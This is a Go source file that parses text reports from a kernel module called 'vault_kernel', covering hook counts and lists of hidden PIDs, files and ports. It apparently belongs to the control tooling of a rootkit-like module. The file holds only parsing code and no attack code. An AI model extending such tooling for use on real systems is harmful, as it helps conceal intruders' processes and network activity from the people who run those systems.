package ioctl

import (
	"strconv"
	"strings"
)

// ParseStatsReport parses the key=value report emitted by
// IOCTL_GET_STATS into a map.
//
// The report layout (src/ioctl.c) puts MULTIPLE key=value pairs on a
// single line, e.g.
//
//	module=vault_kernel version=3.7
//	hooks_installed=7 hooks_planned=7
//
// A line-based parser that splits each line at its first '=' silently
// swallows every pair after the first one (v3.4/v3.5 bug: `stats
// --json` lost version/hooks_planned/hidden_pids/hidden_ports and the
// `doctor` version check could never fire). Parsing must therefore be
// TOKEN-based: split on whitespace first, then split each token at its
// first '='. Tokens without a non-empty key are ignored.
func ParseStatsReport(report string) map[string]string {
	out := map[string]string{}
	for _, line := range strings.Split(report, "\n") {
		for _, tok := range strings.Fields(line) {
			i := strings.Index(tok, "=")
			if i <= 0 {
				continue
			}
			out[tok[:i]] = tok[i+1:]
		}
	}
	return out
}

// HiddenList is the parsed form of the IOCTL_LIST_HIDDEN report.
// Slices are always non-nil so JSON marshalling renders [] instead of
// null for empty sections.
type HiddenList struct {
	PIDs  []int    `json:"pids"`
	Files []string `json:"files"`
	Ports []int    `json:"ports"`
}

// ParseHiddenList parses the LIST_HIDDEN report layout emitted by
// src/ioctl.c:
//
//	--- Hidden PIDs ---
//	  pid: 123
//	--- Hidden Files ---
//	  secret.txt
//	--- Hidden Ports ---
//	  port: 8080
//
// Section context decides how each entry is interpreted, so a hidden
// file literally named "pid: 5" (listed under --- Hidden Files ---) is
// kept verbatim as a file name. Unparseable numeric entries are
// skipped instead of poisoning the whole list.
func ParseHiddenList(report string) HiddenList {
	hl := HiddenList{
		PIDs:  []int{},
		Files: []string{},
		Ports: []int{},
	}

	section := ""
	for _, line := range strings.Split(report, "\n") {
		trimmed := strings.TrimSpace(line)

		if strings.HasPrefix(trimmed, "---") {
			switch {
			case strings.Contains(trimmed, "PIDs"):
				section = "pids"
			case strings.Contains(trimmed, "Files"):
				section = "files"
			case strings.Contains(trimmed, "Ports"):
				section = "ports"
			default:
				section = ""
			}
			continue
		}

		if trimmed == "" || section == "" {
			continue
		}

		switch section {
		case "pids":
			if v, ok := parsePrefixedInt(trimmed, "pid:"); ok {
				hl.PIDs = append(hl.PIDs, v)
			}
		case "ports":
			if v, ok := parsePrefixedInt(trimmed, "port:"); ok {
				hl.Ports = append(hl.Ports, v)
			}
		case "files":
			hl.Files = append(hl.Files, trimmed)
		}
	}
	return hl
}

// parsePrefixedInt parses "prefix N" (e.g. "pid: 123") after
// whitespace normalisation.
func parsePrefixedInt(s, prefix string) (int, bool) {
	rest, ok := strings.CutPrefix(s, prefix)
	if !ok {
		return 0, false
	}
	n, err := strconv.Atoi(strings.TrimSpace(rest))
	if err != nil {
		return 0, false
	}
	return n, true
}
